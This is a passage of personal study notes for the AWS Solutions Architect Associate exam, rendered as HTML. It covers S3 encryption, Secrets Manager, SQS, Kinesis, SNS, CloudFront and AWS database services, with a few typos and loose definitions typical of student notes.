<li>
<p><strong> SSE-AES </strong> S3 handles the key, uses AES-256 algorithm</p>
<ul>
<li>one of the strongest block ciphers available, 256-bit Advanced Encryption Standard (AES-256), to encrypt your data.
<img src="clouds/aws/saa-c03/images/Overview/aes-256.jpg" width="57%" /></li>
</ul>
</li>
</ul>
</li>
<li><strong>Client-side Encryption </strong>using
<ol>
<li>AWS KMS-managed customer master key</li>
<li>client-side master key</li>
</ol>
</li>
<li><strong>Cross-Account Access</strong>
You can provide another AWS account access to an object that is stored in an S3 bucket.
<ul>
<li>
<p>These are the methods on how to grant cross-account access to objects that are stored in your own Amazon S3 bucket:</p>
<ul>
<li><strong>Resource-based policies and IAM policies </strong></li>
<li><strong>Resource-based Access Control List (ACL) and IAM policies </strong></li>
</ul>
</li>
<li>
<p>Cross-account IAM roles for programmatic and console access to S3 bucket objects</p>
</li>
<li>
<p><ins> Supports failover controls for S3 Multi-Region access points.</ins></p>
</li>
</ul>
</li>
<li><strong>Requester Pays Buckets </strong>
<ul>
<li>Bucket owners pay for all of the Amazon S3 storage and data transfer costs associated with their bucket.</li>
</ul>
</li>
</ul>
<h2 id="cloudfront-1"><a class="header" href="#cloudfront-1">CloudFront</a></h2>
<hr>
<h2 id="secrets-manager"><a class="header" href="#secrets-manager">Secrets Manager</a></h2>
<hr>
<ul>
<li>Helps to <ins> <i> manage, retrieve and <strong>rotate database credentials,</strong> application credentials, OAuth tokens, API keys and other secrets throughout their lifecycles
</i></ins></li>
<li>Helps to <ins> improve security posture </ins>, because you <ins><strong>no longer need hard-coded credentials</strong> </ins> in application source code.
<ul>
<li>Storing the credentials in Secrets Manager helps avoid possible compromise by anyone who can inspect the application or the components.</li>
<li>Replace hard-coded credentials with a runtime call to the Secrets Manager service to retrieve credentials with a runtime call to the Secrets Manager service to retrieve credentials dynamically when you need them.</li>
</ul>
</li>
</ul>
<h2 id="textract"><a class="header" href="#textract">Textract</a></h2>
<hr>
<ul>
<li>A fully managed document analysis service for detecting and extracting information from scanned documents</li>
<li>Return extracted data as key-value pairs (e.g. Name: John Doe)</li>
<li>Supports virtually any type of documents</li>
<li>Pricing
<ul>
<li>Pay for what you use</li>
<li>Charges vary for Detect Document Text API and Analyze Document API with the later being more expensive</li>
</ul>
</li>
</ul>
<h2 id="rpo-and-rto"><a class="header" href="#rpo-and-rto">RPO and RTO</a></h2>
<hr>
<ul>
<li>RTO (Recovery Time Object)
<ul>
<li>measures how quickly the application should be available after an outage</li>
</ul>
</li>
<li>RPO (Recovery Point Object)
<ul>
<li>refers to how much data loss can the application can tolerate</li>
</ul>
</li>
</ul>
<img src="clouds/aws/saa-c03/images/Overview/rto-rpo.jpg" width="87%" />
<pre><code>- Data loss is measured from most recent backup to the point of disaster. Downtime is measured from the point of disaster until fully recovered and available for service.
</code></pre>
<h2 id="ec2-1"><a class="header" href="#ec2-1">EC2</a></h2>
<hr>
<hr>
<h2 id="network-firewall"><a class="header" href="#network-firewall">Network Firewall</a></h2>
<hr>
<ul>
<li>AWS Network Firewall supports domain name stateful network traffic inspection</li>
<li>Can create <ins>allow lists and deny lists </ins> with domain names that the stateful rules engine looks for in network traffic</li>
<li>AWS Network Firewall is a <ins>stateful, managed network firewall and intrusion detection and prevention service for your virtual private cloud (VPC)</ins> that you created in Amazon Virtual Private Cloud (Amazon VPC).
<ul>
<li>With Network Firewall, <ins>you can filter traffic at the perimeter of your VPC. </ins></li>
<li>This includes filtering traffic going to and coming from an internet gateway, NAT gateway, or over VPN or AWS Direct Connect.</li>
</ul>
</li>
<li>Network Firewall uses the open source intrusion prevention system (IPS), Suricata, for stateful inspection. Network Firewall supports Suricata compatible rules.</li>
</ul>
<hr>
<h2 id="security"><a class="header" href="#security">Security</a></h2>
<hr>
<ul>
<li>
<p>The security pillar includes the ability to protect data, systems, and assets to take advantage of cloud technologies to improve security</p>
</li>
<li>
<p><strong>Zero Trust</strong> security is a model where application <ins>components or microservices are considered discrete from each other </ins> and no component or microservice trusts any other.</p>
<h3 id="design-principles"><a class="header" href="#design-principles">Design Principles</a></h3>
<ol>
<li>
<p><strong> Implement a strong identity foundation </strong></p>
</li>
<li>
<p><strong>Enable traceability</strong></p>
</li>
<li>
<p><strong>Apply security at all layers:</strong></p>
<ul>
<li>
<p>Apply a <strong>defense in depth approach </strong>  with multiple security controls</p>
</li>
<li>
<p><ins>Implementing security to multiple layers </ins>(for example, edge of network, VPC, load balancing, every instance and compute service, operating system, application, and code).</p>
  <img src="clouds/aws/saa-c03/images/Overview/defense-in-depth.jpg" width="57%" />
</li>
</ul>
</li>
<li>
<p><strong>Automate security best practices:</strong></p>
</li>
<li>
<p><strong>Protect data in transit and at rest:</strong></p>
</li>
<li>
<p><strong>Keep people away from data:</strong></p>
</li>
<li>
<p><strong>Prepare for security events:</strong></p>
</li>
</ol>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="study-more"><a href="#study-more" class="header">Study-more</a></h1>
<p>[ ] Spot Fleets
[ ] Reserved Instances vs. Dedicated Hosts</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="tutorialsdojo-cheatsheets"><a href="#tutorialsdojo-cheatsheets" class="header">Tutorialsdojo Cheatsheets</a></h1>
<ul>
<li><a href="https://tutorialsdojo.com/aws-identity-and-access-management-iam/?src=udemy">IAM</a></li>
<li><a href="https://tutorialsdojo.com/aws-directory-service/?src=udemy">AWS Directory Service</a></li>
<li><a href="https://tutorialsdojo.com/amazon-s3/?src=udemy">S3</a></li>
<li><a href="https://tutorialsdojo.com/amazon-relational-database-service-amazon-rds/?src=udemy">RDS</a></li>
<li><a href="https://tutorialsdojo.com/amazon-aurora/?src=udemy">Aurora</a></li>
<li><a href="https://tutorialsdojo.com/amazon-dynamodb/?src=udemy">DynamoDB</a></li>
<li><a href="https://tutorialsdojo.com/amazon-ebs/?src=udemy">EBS</a></li>
<li><a href="https://tutorialsdojo.com/amazon-route-53/?src=udemy">Route53</a></li>
<li><a href="https://tutorialsdojo.com/aws-auto-scaling/?src=udemy">Auto Scaling</a></li>
<li><a href="https://tutorialsdojo.com/aws-key-management-service-aws-kms/?src=udemy">KMS</a></li>
<li><a href="#tutorialsdojo-cheatsheets">EFS</a></li>
<li></li>
<li><a href="https://tutorialsdojo.com/aws-cloudhsm/">cloudHSM (optional)</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="api-gateway-cheatsheet"><a href="#api-gateway-cheatsheet" class="header">Api-gateway-cheatsheet</a></h1>
<ul>
<li>
<p>Enables developers to create, publish, maintain, monitor, and secure APIs at any scale</p>
</li>
<li>
<p>Create RESTful or WebSocket APIs</p>
</li>
<li>
<p>HIPAA compliant service</p>
</li>
<li>
<p>Allows creating, deploying and managing a RESTful API to expose backend HTTP endpoints, Lambda functions or other AWS services</p>
</li>
<li>
<p>Concepts</p>
<ul>
<li>API deployment
<ul>
<li>a point-in-time snapshot of your API Gateway API resource and methods. To be available for clients to use, the deployment must be associated with one or more API stages</li>
</ul>
</li>
<li>API endpoints
<ul>
<li>host names APIs in API Gateway, which are deployed to a specific region and of the format: rest-api-id.execute-api.region.amazonaws.com</li>
</ul>
</li>
<li>Usage Plan
<ul>
<li>Provides selected API clients with access to one or more deployed APISs. You can use a usage plan to configure throttling and quota limits, which are enforced on individual client API keys</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Features:</p>
<ul>
<li>Amazon API Gateway provides <b> <ins> throttling at multiple levels including global and by a service call.</ins></b> Throttling limits can be set for standard rates and bursts.
<ul>
<li>For example, API owners can set a rate limit of 1,000 requests per second for a specific method in their REST APIs, and also configure Amazon API Gateway to handle a burst of 2,000 requests per second for a few seconds.</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Endpoint Types</p>
<ul>
<li>Edge-optimized: For global clients
<ul>
<li>Requests are routed through a Cloudfront Edge Location for improved latency</li>
<li>The API Gateway still only lives in one region</li>
</ul>
</li>
<li>Regional: for clients within the same region
<ul>
<li>You could still manually combine with CloudFront for control over caching strategies</li>
</ul>
</li>
<li>Private: Only accessible in our VPC
<ul>
<li>Use a resource policy to define access</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Stages</p>
<ul>
<li>Create stages for different deployments of the API. Example: Production, Sandbox, QA, etc.</li>
<li>Switch between stages seamlessly</li>
<li>Similar to Azure Web App Deployment Slots</li>
<li>Use stage variables</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="queueing-sqs-1"><a href="#queueing-sqs-1" class="header">Queueing (SQS)</a></h1>
<ul>
<li><a href="#queueing-sqs">Queueing (SQS) </a></li>
<li><a href="#sqs-message-visibility-timeout">SQS Message Visibility Timeout</a></li>
<li><a href="#long-polling">Long Polling</a></li>
<li><a href="#streaming-and-kinesis">Streaming and Kinesis</a>
<ul>
<li><a href="#kinesis-data-streams-1">Kinesis Data Streams</a></li>
<li><a href="#kinesis-data-firehose-1">Kinesis Data Firehose</a></li>
<li><a href="#kinesis-data-streams-vs-firehose">Kinesis Data Streams vs Firehose</a></li>
<li><a href="#kinesis-data-analytics">Kinesis Data Analytics</a></li>
<li><a href="#kinesis-video-streams">Kinesis Video Streams</a></li>
</ul>
</li>
<li><a href="#pubsub-sns">Pub-Sub and SNS</a>
<ul>
<li><a href="#what-is-pub-sub">What is Pub/Sub ?</a></li>
</ul>
</li>
<li><a href="#sqs-and-sns---fan-out-pattern">SQS and SNS - Fan Out Pattern</a></li>
</ul>
<hr>
<h2 id="queueing-sqs"><a class="header" href="#queueing-sqs">Queueing (SQS)</a></h2>
<hr>
<ul>
<li>
<p><b> What is Messaging System ?</b></p>
<ul>
<li>Used to provide asynchronous communication and decouple processes via messages / events from sender and receiver (producer and consumer)</li>
</ul>
</li>
<li>
<p><b> What is Queuing System ?</b></p>
<ul>
<li>A queueing system is a <ins> messaging system that generally will <b> delete </b> messages once they are consumed </ins>.</li>
<li>Simple Communication</li>
<li><ins> <i> Not Real-time  </i></ins></li>
<li>Have to pull</li>
<li>Not reactive</li>
</ul>
</li>
<li>
<p><b> Simple Queuing System (SQS) </b></p>
<ul>
<li>Fully managed <b><ins> queuing service that enables you to decouple </ins> </b>and scale mircroservices, distributed systems, and serverless applications</li>
<li>Use Case: You need to queue up transaction emails to be sent</li>
<li>e.g. Signup, Reset Password</li>
<li>Default retention <ins>4 Days and Max of 14 days</ins></li>
<li>Limitation of 256 KB per message sent</li>
<li>Low Latency (&lt;10ms on publish and receive)</li>
<li>Can have <ins>duplicate messages</ins> (at least once delivery, occasionally)</li>
<li><strong><ins> Unlimited Throughput </ins></strong></li>
</ul>
  <img src="clouds/aws/saa-c03/images/Application-Integration/SQS.jpg" width="45%" />
<ul>
<li>Encryption:
<ul>
<li>In-flight encryption using HTTPS API</li>
<li>At-rest encryption using KMS keys</li>
<li>Client-side encryption if the client wants to perform encryption/decryption itself</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="sqs-message-visibility-timeout"><a class="header" href="#sqs-message-visibility-timeout">SQS Message Visibility Timeout</a></h2>
<hr>
<ul>
<li><strong><ins>After a message is polled by a customer it becomes invisible to other consumers</ins></strong></li>
<li>By default the ‚Äú message visibility timeout‚Äú is 30 seconds</li>
<li>That means the message has 30 seconds to process</li>
<li>If the message is not processed in the visibility timeout, it will be processed twice</li>
<li>A consumer could call the <code>ChangeMessageVisibility</code> API to get more time</li>
<li>If the visibility timeout is high(hours) and consumer crashes, reprocessing will take time</li>
<li>If visibility <ins>timeout is too low (seconds)</ins>, we may <ins>get duplicates</ins></li>
</ul>
<h2 id="long-polling"><a class="header" href="#long-polling">Long Polling</a></h2>
<hr>
<ul>
<li>When a consumer requests messages from the queue, it can optionally ‚Äòwait‚Äô for messages to arrive if there are none in the queue - <strong> Long Polling </strong></li>
<li>Long Polling decreases the number of API calls made to SQS while increasing the latency and efficiency of the application</li>
<li>The wait time can be between 1 sec to 20 sec</li>
<li>Long Polling is preferable to Short Polling</li>
<li>Long Polling can be enabled at the queue level or at the API level using <code>WaitTimeSeconds</code></li>
</ul>
<hr>
<h2 id="streaming-and-kinesis"><a class="header" href="#streaming-and-kinesis">Streaming and Kinesis</a></h2>
<hr>
<ul>
<li>
<p><b> What is Streaming ? </b></p>
<ul>
<li>
<p>Multiple consumers can <b> react </b> to events (messages)</p>
</li>
<li>
<p>Events live in the stream for long periods of time, so complex operations can be applied</p>
</li>
<li>
<p><b><ins> Real-time </ins> </b></p>
</li>
<li>
<p><b> Amazon-Kinesis </b></p>
<ul>
<li>Amazon Kinesis is the AWS fully managed solution for collecting, processing and <ins> analyzing streaming data in the cloud </ins></li>
</ul>
  <img src="clouds/aws/saa-c03/images/Application-Integration/amazon-kinesis.jpg" width="65%" />
</li>
</ul>
<h3 id="kinesis-data-streams-1"><a class="header" href="#kinesis-data-streams-1">Kinesis Data Streams</a></h3>
<ul>
<li><strong><ins> Capture,process and store data streams</ins> </strong>
<img src="clouds/aws/saa-c03/images/Application-Integration/kinesis-data-streams.jpg" width="65%" />
<ul>
<li>
<p>Security:</p>
  <img src="clouds/aws/saa-c03/images/Application-Integration/kinesis-data-streams-security.jpg" width="65%" />
<ul>
<li>Control access/ authorization using IAM policies</li>
<li>Encryption in flight using HTTPS endpoints</li>
<li>Encryption at rest using KMS</li>
<li>You can implement encryption/decryption of data on client-side (harder)</li>
<li>VPC endpoints available for Kinesis to access within VPC</li>
<li><ins>Monitor API calls using CLoudTrail</ins></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="kinesis-data-firehose-1"><a class="header" href="#kinesis-data-firehose-1">Kinesis Data Firehose</a></h3>
<ul>
<li><strong><ins>load data streams into AWS data stores</ins></strong></li>
<li>Pay for only data that is going through Firehose</li>
<li>Supports many data formats, conversions,
transformations, compression
<img src="clouds/aws/saa-c03/images/Application-Integration/kinesis-data-firehose.jpg" width="65%" /></li>
</ul>
<h3 id="kinesis-data-streams-vs-firehose"><a class="header" href="#kinesis-data-streams-vs-firehose">Kinesis Data Streams vs Firehose</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Kinesis Data Streams</th><th>Kinesis Data Firehose</th></tr>
</thead>
<tbody>
<tr><td>- Streaming service for ingest at scale</td><td>- Load streaming data into S3 /Redshift /OpenSearch / 3rd Party /custom HTTP</td></tr>
<tr><td>write Custom code (producer/consumer)</td><td>Fully managed</td></tr>
<tr><td><strong> <i><ins>Real-time (~200 ms)</ins></i></strong></td><td><strong> <i><ins> Near real-time (buffer time min 60 sec)</ins></i></strong></td></tr>
<tr><td>Managed scaling (shard splitting / merging)</td><td>Automatic scaling</td></tr>
<tr><td>Data storage for <ins> 1 to 365 days </ins></td><td><ins>No data storage </ins></td></tr>
<tr><td>Supports replay capability</td><td>Doesn‚Äôt support Capability</td></tr>
</tbody>
</table>
</div>
<h3 id="kinesis-data-analytics"><a class="header" href="#kinesis-data-analytics">Kinesis Data Analytics</a></h3>
<ul>
<li><strong><ins>analyze data streams with SQL or Apache Flink</ins></strong></li>
</ul>
<h3 id="kinesis-video-streams"><a class="header" href="#kinesis-video-streams">Kinesis Video Streams</a></h3>
<ul>
<li><strong><ins>Capture, process and store video streams</ins></strong></li>
</ul>
</li>
</ul>
<hr>
<h2 id="pub-sub-and-sns"><a class="header" href="#pub-sub-and-sns">Pub-Sub and SNS</a></h2>
<hr>
<ul>
<li>
<h3 id="what-is-pub--sub-"><a class="header" href="#what-is-pub--sub-"><b> What is Pub / Sub ? </b></a></h3>
<ul>
<li>
<p>Publish-subscribe pattern commonly <i> <ins> implemented in <b> messaging systems. </b> </ins></i></p>
</li>
<li>
<p>In a pub/sub system the sender of messages <ins> <b> (publishers)</b> do not send their messages directly to receivers.</ins></p>
</li>
<li>
<p>They instead send their messages to an <ins> <b> event bus </b> </ins>. The <ins> event bus categorizes their messages into groups</ins>.</p>
</li>
<li>
<p>The receivers of messages <ins> <b> Subscribers </b> subscribe to these groups</ins></p>
</li>
<li>
<p>Whenever new messages appear within their subscription the messages are immediately delivered to them</p>
  <img src="clouds/aws/saa-c03/images/Application-Integration/pub-sub.jpg" width="35%" />
</li>
<li>
<p>Publisher have no knowledge of who their subscribers are</p>
</li>
<li>
<p>Subscribers do not pull for messages</p>
</li>
<li>
<p>Messages are instead <ins> automatically and immediately pushed to subscribers</ins></p>
</li>
<li>
<p>Messages and events are interchangeable terms in pub/sub</p>
</li>
<li>
<p>Use case:</p>
<ul>
<li>A real-time chat system</li>
<li>A web-hook system</li>
</ul>
</li>
</ul>
</li>
<li>
<h3 id="simple-notification-service"><a class="header" href="#simple-notification-service"><b> Simple Notification Service </b></a></h3>
<ul>
<li>It is a highly available, durable, secure,  <ins> <b> fully managed pub/sub messaging service </b> </ins> that enables you to  <i> <ins> decouple</ins> microservices, distributed systems and serverless applications </i></li>
</ul>
  <img src="clouds/aws/saa-c03/images/Application-Integration/sns.jpg" width="55%" />
</li>
</ul>
<h2 id="sqs-and-sns---fan-out-pattern"><a class="header" href="#sqs-and-sns---fan-out-pattern">SQS and SNS - Fan Out Pattern</a></h2>
<hr>
<ul>
<li>Push once in SNS, receive in all SQS queues that are subscribers
<img src="clouds/aws/saa-c03/images/Application-Integration/fan-out.jpg" width="55%" /></li>
<li>Fully decoupled : no data loss</li>
<li>SNS - Message Filtering
<ul>
<li><strong><ins>JSON policy used to filter messages sent to SNS topic‚Äôs subscriptions</ins></strong></li>
<li>If a subscription doesn‚Äôt have a filter policy, it receives every message</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="cloudfront-cheatsheet"><a href="#cloudfront-cheatsheet" class="header">Cloudfront-cheatsheet</a></h1>
<ul>
<li>CloudFront is a CDN (Content Distribution Network). It makes website load fast by serving cached content that is nearby</li>
<li>CloudFront distributes cached copy at <ins> Edge Locations </ins></li>
<li>Edge Locations aren‚Äôt just not read-only , you can write them eg. PUT objects</li>
<li>TTL (Time to live) defines how long until the cache expires (refreshes cache)</li>
<li>When you invalidate your cache, you are forcing it to immediately expire (refreshes cached data)</li>
<li>Refreshing the cache costs money because of transfer costs to update Edge locations</li>
<li>Origin is the address of where the original copies of your files reside eg. S3, EC2, ELB, Route53</li>
<li><b> Distribution </b> defines a collection of Edge Locations and behavior on how it should handle your cached content</li>
<li>Distributions has 2 Types :
<ul>
<li>Web Distribution (statis website content)</li>
<li>RTMP (steaming media)</li>
</ul>
</li>
<li>Origin Identity Access (OAI) is used access private S3 buckets</li>
<li>Access to <b> cached content can be protected</b> via <ins> Signed URLs or Signed Cookies </ins></li>
<li>Lambda@Edge allows you to pass each request through a Lambda to change the behavior of the response</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="cloudfront-3"><a href="#cloudfront-3" class="header">CloudFront</a></h1>
<ul>
<li><a href="#cloudfront-2">CloudFront</a></li>
<li><a href="#cloudfront-core-components-2">CloudFront Core Components</a></li>
<li><a href="#cloudfront-distributions-2">CloudFront Distributions</a></li>
<li><a href="#lambdaedge-2">Lambda@Edge</a></li>
<li><a href="#cloudfront-protection-2">CloudFront Protection</a></li>
</ul>
<hr>
<h2 id="cloudfront-2"><a class="header" href="#cloudfront-2">CloudFront</a></h2>
<hr>
<ul>
<li>
<p>Content Distribution Network (CDN) creates cached copies of your website at various Edge locations around the world</p>
</li>
<li>
<p>Content Delivery Network (CDN)</p>
<ul>
<li>
<p>A CDN is a distributed network of servers which delivers web pages and content to users based on their geographical location, the origin of the webpage and a content delivery server</p>
<ul>
<li>
<p>Can be used to deliver an entire website including static, dynamic and streaming</p>
</li>
<li>
<p>216 points of presence globally</p>
</li>
<li>
<p>DDoS protection since it is a global service. Integrates with AWS Shield and AWS WAF</p>
</li>
<li>
<p>Requests for content are served from the nearest Edge Location for the best possible performance</p>
<img src="clouds/aws/saa-c03/images/CloudFront/CDN.jpg" width="77%" height="40%" />
</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h2 id="cloudfront-core-components-2"><a class="header" href="#cloudfront-core-components-2">CloudFront Core Components</a></h2>
<hr>
<ul>
<li>
<p><b> Origin </b></p>
<ul>
<li>The location where all of original files are located. For example an S3 Bucket, EC2 Instance, ELB or Route53</li>
</ul>
</li>
<li>
<p><b> Edge Location </b></p>
<ul>
<li>The location where web content will be cached. This is different than an AWS Region or AZ</li>
</ul>
</li>
<li>
<p><b> Distribution </b></p>
<ul>
<li>
<p>A collection of Edge locations which defines how cached content should behave</p>
<img src="clouds/aws/saa-c03/images/CloudFront/cloudfront-core-components.jpg" width="77%" height="40%" />
</li>
</ul>
</li>
</ul>
<hr>
<h2 id="cloudfront-distributions-2"><a class="header" href="#cloudfront-distributions-2">CloudFront Distributions</a></h2>
<hr>
<ul>
<li>A distribution is a collection of Edge Location. You specific the Origin eg. S3, EC2, ELB, Route53</li>
<li>It replicates copies based on your Price Class</li>
<li>There are two types of Distributions
<ol>
<li>Web (for Websites)</li>
<li>RTMP (for streaming media)</li>
</ol>
</li>
<li><b> Behaviors </b>
<ul>
<li>Redirect to HTTPs, Restrict HTTP Methods, Restrict Viewer Access, Set TTLs</li>
</ul>
</li>
<li><b> Invalidations </b>
<ul>
<li>You can manually invalidate cache on specific files via Invalidations</li>
</ul>
</li>
<li><b> Error Pages </b>
<ul>
<li>You can serve up custom error pages eg 404</li>
</ul>
</li>
<li><b> Restrictions </b>
<ul>
<li>You can use Geo Restriction to blacklist or whitelist specific countries</li>
</ul>
</li>
</ul>
<hr>
<h2 id="lambdaedge-2"><a class="header" href="#lambdaedge-2">Lambda@Edge</a></h2>
<hr>
<ul>
<li>
<p>Lambda@Edge functions are used to override the behavior of request and responses</p>
</li>
<li>
<p>Lambda@Edge lets you run Lambda functions to customize the content that CloudFront delivers, executing the functions in AWS locations closer to the viewer.</p>
</li>
<li>
<p>The functions run in response to CloudFront events, without provisioning or managing servers. You can use Lambda functions to change CloudFront requests and responses at the following points:</p>
</li>
<li>
<p>The 4 Available Edge Functions</p>
<ol>
<li>Viewer Request
<ul>
<li>When CloudFront receives a request from a Viewer</li>
</ul>
</li>
<li>Origin request
<ul>
<li>Before CLoudFront forwards a request to the origin</li>
</ul>
</li>
<li>Origin response
<ul>
<li>When cloudfront receives a response from the origin</li>
</ul>
</li>
<li>Viewer response
<ul>
<li>Before CLoudFront returns the response to the viewer</li>
</ul>
</li>
</ol>
  <img src="clouds/aws/saa-c03/images/CloudFront/lambda.jpg" width="47%" />
  <img src="clouds/aws/saa-c03/images/CloudFront/Lamda@edge.jpg" width="47%" />
</li>
</ul>
<hr>
<h2 id="cloudfront-protection-2"><a class="header" href="#cloudfront-protection-2">CloudFront Protection</a></h2>
<hr>
<ul>
<li>By Default a Distribution allows everyone to have access</li>
<li>Original Identity Access (OAI)
<ul>
<li>A virtual user identity that will be used to give your CloudFront Distribution permission to fetch a private object</li>
</ul>
</li>
<li>Inorder to use Signed URLs or Signed Cookies you need to have an OAI</li>
<li><b> Signed URLs </b>
<ul>
<li>(Not the same thing as S3 Presigned URL)
<ul>
<li>A url with provides temporary access to cached objects</li>
</ul>
</li>
</ul>
</li>
<li><b> Signed Cookies </b>
<ul>
<li>A cookie which is passed along with the request to CloudFront. The advantage of using a Cookie is you want to provide access to multiple restricted files. eg. Video Streaming</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="what-is-database--1"><a href="#what-is-database--1" class="header">What is Database ?</a></h1>
<ul>
<li><a href="#what-is-database">What is Database</a></li>
<li><a href="#what-is-data-warehouse">What is Data Warehouse</a></li>
<li><a href="#what-is-a-key-value-store">What is a key value store?</a></li>
<li><a href="#what-is-a-document-database">What is a document database?</a></li>
<li><a href="#nosql-database-services">NOSQL Database Services</a>
<ul>
<li><a href="#dynamodb-2">DynamoDB</a></li>
<li><a href="#documentdb">DocumentDB</a></li>
<li><a href="#amazon-keyspaces">Amazon Keyspaces</a></li>
</ul>
</li>
<li><a href="#relational-database-service">Relational Database Service</a></li>
<li><a href="#other-database-services">Other Database Services</a></li>
</ul>
<hr>
<h2 id="what-is-database-"><a class="header" href="#what-is-database-">What is Database ?</a></h2>
<hr>
<ul>
<li><i> A database is data-store that store semi-structured and structured data</i></li>
<li>A database is more complex stores because it requires using formal design and modeling techniques</li>
<li>Database types:
<ul>
<li><b> Relational Database </b>
<ul>
<li>Structured data represents tabular data (tables,rows and columns)</li>
</ul>
</li>
<li><b> Non-Relational Database </b>
<ul>
<li>Semi-Structured that may or may not represent tabular data</li>
</ul>
</li>
</ul>
</li>
<li>Set of functionality:
<ul>
<li>query</li>
<li>modeling strategies to optimize retrieval for different use cases</li>
<li>control over the transformation of the data into useful data structures or reports
<img src="clouds/aws/saa-c03/images/database/database.png" alt="Database"></li>
</ul>
</li>
</ul>
<hr>
<h2 id="what-is-data-warehouse-"><a class="header" href="#what-is-data-warehouse-">What is Data Warehouse ?</a></h2>
<hr>
<ul>
<li>Relational Database : designed for analytic workloads and a column-oriented data-store</li>
<li>Companies will have terabytes and millions of rows of data</li>
<li>Data warehouses generally perform <ins> aggregation</ins>
<ul>
<li>aggregation is is grouping data eg. finding a total or average</li>
<li>Data warehouses are optimised around columns since they need quickly aggregate column data</li>
</ul>
</li>
<li>Data warehouses are generally designed be HOT
<ul>
<li>HOT means they can return queries very fast even though they have vast amounts of data</li>
</ul>
</li>
<li>Data warehouses are infrequently accessed
<ul>
<li>intended for real time reporting but maybe once or twice a day or once a week to generate business or user reports</li>
</ul>
</li>
<li>Data Warehouse needs to consume data from a relational database on a regular basis</li>
</ul>
<hr>
<h2 id="what-is-a-key-value-store-"><a class="header" href="#what-is-a-key-value-store-">What is a Key Value Store ?</a></h2>
<hr>
<ul>
<li><i> A key-value database is a type of non-relational database (NoSQL) that uses a simple key-value method to store data </i>
<ul>
<li>Stores a <ins> unique key </ins>  alongside a value</li>
<li>will interpret this data resembling a dictionary</li>
<li>can resemble tabular data, it does not have to have the consistent columns per row
-Due to simple design so they can scale well beyond a relational database</li>
</ul>
</li>
</ul>
<hr>
<h2 id="what-is-a-document-database-"><a class="header" href="#what-is-a-document-database-">What is a document database ?</a></h2>
<hr>
<ul>
<li>Document store
-<i> a NOSQL database that stores documents as its primary data-structure</i>
<ul>
<li>
<p>it could be an XML but more commonly is JSON or JSON-like</p>
</li>
<li>
<p>they are sub-class of key/value stores</p>
  <img src="clouds/aws/saa-c03/images/database/document_store.png" width="55%" float="right" />
</li>
</ul>
</li>
</ul>
<hr>
<h2 id="nosql-database-services"><a class="header" href="#nosql-database-services">NOSQL Database Services</a></h2>
<hr>
<ul>
<li>
<h3 id="dynamodb-2"><a class="header" href="#dynamodb-2">DynamoDB</a></h3>
<ul>
<li>a serverless <ins> NOSQL key/Value and document database</ins></li>
<li>designed to scale to billions of records  with consistent data return in at <ins>least a second- millisecond latency</ins></li>
<li>It is AWS‚Äôs <ins> flagship database service  meaning it is cost-effective and very fast</ins></li>
<li><strong>DAX cluster</strong> for read cache, microsecond read latency</li>
<li>Event Processing: DynamoDB Streams to integrate with AWS Lambda, or Kinesis Data Streams</li>
<li>Global Table feature: active-active setup</li>
<li>Automated backups up to 35 days with PITR (restore to new table), or on-demand backups</li>
<li>Export to S3 without using RCU within the PITR window, import from S3 without using WCU</li>
<li>Great to rapidly evolve schema</li>
<li>It is a <ins>massively scalable database </ins></li>
<li><strong>Usecases:</strong> Serverless applications development (small documents 100s Kb), distributed serverless cache</li>
</ul>
</li>
<li>
<h3 id="documentdb"><a class="header" href="#documentdb">DocumentDB</a></h3>
<ul>
<li>A NOSQL <ins> document database </ins> that is <ins>‚ÄúMongoDB compatible‚Äù</ins></li>
<li>MongoDB is very popular NOSQL among developers there were open-source licensing issues around using open-source MongoDB , so aws got aorund it by just building their own MongoDB database</li>
<li><i> when you want a MongoDB database </i></li>
</ul>
</li>
<li>
<h3 id="amazon-keyspaces"><a class="header" href="#amazon-keyspaces">Amazon KeySpaces</a></h3>
<ul>
<li>A fully managed <ins> Apache Cassandra database </ins></li>
<li>Cassandra is an open-source NOSQL key/value database similar to DynamoDB in that is columnar store database but has some additional functionality</li>
<li><i> when you want to use Apache Casandra </i></li>
</ul>
</li>
</ul>
<hr>
<h2 id="relational-database-service"><a class="header" href="#relational-database-service">Relational Database Service</a></h2>
<hr>
<ul>
<li>
<h3 id="relational-database-services-rds"><a class="header" href="#relational-database-services-rds">Relational Database Services (RDS)</a></h3>
<ul>
<li>supports multiple SQL engines</li>
<li>Relational is synonymous with SQL and Online Transactional Processing (OLTP)</li>
<li>most commonly used type of database among tech companies and start ups</li>
<li>RDS supports the following SQL Engines:
<ul>
<li><b>MYSQL </b> - Most popular open source SQL database that was purchased and now owned by Oracle</li>
<li><b> MariaDB </b> - When Oracle bought MYSQL. MariaDB made a fork (copy) of MYSQL was made under a different open-source license</li>
<li><b> Postgres (PSQL) </b> - Most popular open-source SQL database among developers. Has rich-features over MYSQL but at added complexity</li>
<li><b> Oracle </b> - Oracle‚Äôs proprietary SQL database. Well used by Enterprise companies. Have to buy a license to use it</li>
<li><b> Microsoft SQL Server </b> - Microsoft‚Äôs proprietary SQL database. Have to buy license to use it</li>
<li><b> Aurora </b> - Fully managed database
<ul>
<li><b> Aurora </b>
<ul>
<li>fully managed database,</li>
<li>database of either <ins>MYSQL (5X faster) and PSQL (3X faster) database </ins></li>
<li><i> When you want a highly available, durable, scalable and secure relational database for Postgres or MySQL then Aurora is correct fit</i></li>
</ul>
</li>
</ul>
</li>
<li><b> Aurora Serverless </b>
- serverless on-demand version of Aurora.
- When you want ‚Äúmost‚Äù of the benefits of Aurora but can trade to have cold-starts or you don‚Äôt have lots of traffic demand</li>
<li><b> RDS on VMware </b>
- allows you to deploy RDS supported engines to on-premise data center.
- datacenter must be using VMware for server virtualization
